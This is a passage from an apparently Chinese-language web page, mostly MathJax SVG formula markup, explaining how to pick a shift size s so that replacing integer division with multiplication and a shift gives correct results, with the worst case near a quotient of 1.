289Z"></path></g></g><g data-mml-node="mo" transform="translate(8649.1,0)"><path data-c="230B" d="M229 734Q229 735 230 737T232 740T235 744T239 747T244 749T251 750Q262 748 269 735V-235Q266 -240 256 -249L147 -250H77Q43 -250 32 -247T21 -230T32 -213T72 -209Q79 -209 99 -209T133 -210H229V734Z"></path></g><g data-mml-node="mo" transform="translate(9370.9,0)"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="mi" transform="translate(10426.6,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(10998.6,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="mi" transform="translate(11498.6,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(12210.9,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(13211.1,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(13783.1,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="msup" transform="translate(14283.1,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,413) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g></g></g></svg></mjx-container></span> 我们能发现结果落在一个大小为 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="10.152ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 4487.1 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(1111.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(2111.4,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(2683.4,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="msup" transform="translate(3183.4,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,363) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g><g data-mml-node="mo" transform="translate(4098.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span>
的区间内，这样我们只要找到<strong>一个s</strong>，使得对于<strong>所有x</strong>都有一个整数在此区间内，那么这个算法就能确保给出正确的答案。事实上，我们只需把s设置的比较大，就可以实现这个目的。</p>
<p>最坏情况发生在<strong>最接近 1 的除法</strong>，即： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="24.057ex" height="2.105ex" role="img" focusable="false" viewBox="0 -725.5 10633.2 930.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(849.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(1905.6,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,413) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(3135,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(4135.3,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(4635.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mstyle" transform="translate(4913.3,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mi" transform="translate(6079.9,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(6847.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(7903.5,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,413) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(9133,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(10133.2,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container></span> 这样，商的误差范围最大： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.016ex;" xmlns="http://www.w3.org/2000/svg" width="30.465ex" height="4.545ex" role="img" focusable="false" viewBox="0 -1118 13465.7 2009"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mi" transform="translate(220,676)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(261,-686)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><rect width="772" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(1234.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(2234.4,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(3012.2,0)"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="mo" transform="translate(4068,0)"><path data-c="230A" d="M174 734Q174 735 175 737T177 740T180 744T184 747T189 749T196 750Q206 748 214 735V-210H310H373Q401 -210 411 -213T422 -230T411 -247T369 -251Q362 -251 338 -251T298 -250H190Q178 -246 174 -234V734Z"></path></g><g data-mml-node="mi" transform="translate(4512,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(5306.2,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mi" transform="translate(5806.4,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(6684.4,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="msup" transform="translate(7184.4,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,413) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g><g data-mml-node="mo" transform="translate(8099.1,0)"><path data-c="230B" d="M229 734Q229 735 230 737T232 740T235 744T239 747T244 749T251 750Q262 748 269 735V-235Q266 -240 256 -249L147 -250H77Q43 -250 32 -247T21 -230T32 -213T72 -209Q79 -209 99 -209T133 -210H229V734Z"></path></g><g data-mml-node="mo" transform="translate(8820.9,0)"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="mfrac" transform="translate(9876.6,0)"><g data-mml-node="mi" transform="translate(220,676)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(261,-686)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><rect width="772" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(11110.9,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mfrac" transform="translate(12111.1,0)"><g data-mml-node="mi" transform="translate(391.3,676)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="msup" transform="translate(220,-686)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,289) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g><rect width="1114.6" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container></span> 但如果 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.312ex;" xmlns="http://www.w3.org/2000/svg" width="5.436ex" height="1.751ex" role="img" focusable="false" viewBox="0 -636 2402.6 774"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 